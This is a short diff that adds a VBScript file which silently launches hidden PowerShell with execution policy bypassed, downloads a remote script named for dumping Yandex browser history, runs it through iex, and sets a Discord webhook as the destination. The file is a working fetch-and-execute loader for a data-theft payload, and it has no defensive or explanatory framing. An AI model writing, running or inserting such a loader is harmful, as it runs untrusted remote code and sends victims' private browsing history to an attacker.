@@ -1,0 +1,2 @@
+Set objShell = CreateObject("WScript.Shell")
+objShell.Run "powershell -w h -ep bypass $dc='<DISCORD_WEBHOOK_URL>';irm https://raw.githubusercontent.com/Morzan6/Dump-Browser-History-To-Discord/master/DumpYandexHistory.ps1 | iex", 0, True
